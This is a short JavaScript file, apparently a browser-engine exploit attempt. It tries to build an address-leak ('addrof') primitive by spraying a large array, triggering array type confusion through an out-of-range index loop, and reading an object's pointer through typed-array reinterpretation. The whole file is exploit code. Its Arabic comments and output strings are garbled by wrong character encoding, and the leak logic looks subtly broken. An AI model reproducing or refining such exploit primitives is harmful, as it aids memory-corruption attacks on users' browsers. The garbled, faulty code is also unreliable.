function correct_addrof() {
    let output = "๐ฏ **ุงูุทุฑููุฉ ุงูุตุญูุญุฉ ูุชุณุฑูุจ ุงูุนูุงููู**\n\n";
    
    let arr = [];
    for (let i = 0; i < 2000; i++) arr[i] = i + 0.1;
    for (let i = 0; i < (1 << 22); i++) arr[i] = i + 0.1;
    
    // ูุงุฆู ุงููุฏู
    let target_obj = {
        marker: 0x13371337,
        data: "TARGET_OBJECT"
    };
    
    let victim = [1.1, 2.2, 3.3];
    let largeLength = Object.keys(arr).length;
    let index = (largeLength << 3) >> 31;
    
    output += "๐ ุงูุฎุทุฉ: ุงุณุชุฎุฏุงู ูุตูููุฉ ูุฎุชูุทุฉ ุงูุฃููุงุน\n\n";
    
    // ุงูุฎุทูุฉ 1: ุฅูุดุงุก ูุตูููุฉ ูุฎุชูุทุฉ ุงูุฃููุงุน
    let mixed_array = [1.1, target_obj, 3.3]; // [double, object, double]
    
    // ุงูุฎุทูุฉ 2: ุงุณุชุฎุฏุงู ุงูุซุบุฑุฉ ูููุจ ุงูุฃููุงุน
    let confusion_victim = [1.1, 2.2, 3.3];
    
    for (let i = 1; i >= index; i--) {
        confusion_victim[i] = mixed_array; // ุชุฎุฒูู ุงููุตูููุฉ ุงููุฎุชูุทุฉ
    }
    
    output += "ุงูุญุงูุฉ ุจุนุฏ ุงูุซุบุฑุฉ:\n";
    output += `confusion_victim[0]: ${typeof confusion_victim[0]}\n`;
    output += `confusion_victim[1]: ${typeof confusion_victim[1]}\n`;
    output += `confusion_victim[2]: ${typeof confusion_victim[2]}\n`;
    
    // ุงูุขู confusion_victim[1] ูุฌุจ ุฃู ุชุญุชูู ุนูู ุงููุตูููุฉ ุงููุฎุชูุทุฉ
    if (typeof confusion_victim[1] === 'object') {
        output += "\nโ ุชู ุญูู ุงููุตูููุฉ ุงููุฎุชูุทุฉ\n";
        
        // ุญุงูู ุงููุตูู ุฅูู ุงูุนูุงุตุฑ
        try {
            let element_0 = confusion_victim[1][0]; // ูุฌุจ ุฃู ูููู double
            let element_1 = confusion_victim[1][1]; // ูุฌุจ ุฃู ูููู object
            
            output += `confusion_victim[1][0]: ${element_0} (${typeof element_0})\n`;
            output += `confusion_victim[1][1]: ${element_1} (${typeof element_1})\n`;
            
            // ุฅุฐุง ูุงู element_1 ูุง ูุฒุงู ูุงุฆูุ ุฌุฑุจ ุชุญูููู
            if (typeof element_1 === 'object') {
                let f64 = new Float64Array(1);
                let u32 = new Uint32Array(f64.buffer);
                f64[0] = element_1; // ูุฏ ูุนุทููุง NaN ุฃู ุงููุคุดุฑ
                
                let addr = (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
                output += `ุงููุญุงููุฉ 1: 0x${addr.toString(16)}\n`;
            }
        } catch(e) {
            output += `ุฎุทุฃ ูู ุงููุตูู: ${e.message}\n`;
        }
    }
    
    alert(output);
}

correct_addrof();